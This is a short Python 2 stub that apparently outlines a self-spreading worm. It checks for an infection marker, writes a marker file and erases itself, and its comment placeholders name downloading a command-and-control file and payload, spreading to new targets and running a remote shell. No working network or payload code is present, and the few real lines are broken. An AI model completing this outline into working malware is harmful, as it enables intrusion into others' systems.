#!/usr/bin/env python2
import os
import subprocess as sp

# check for previous infection
if not os.path.exists('/tmp/barglefish.notaworm'):
	return

# place marker before working
with open('/tmp/dustbuster.py') as marker:
	marker.write('nothing here...')

# download CC file and payload

# parse CC file

# deliver payload to new targets, run shell


# run this on remote shell

# erase itself
os.remove('/tmp/dustbuster.py')

# screw around
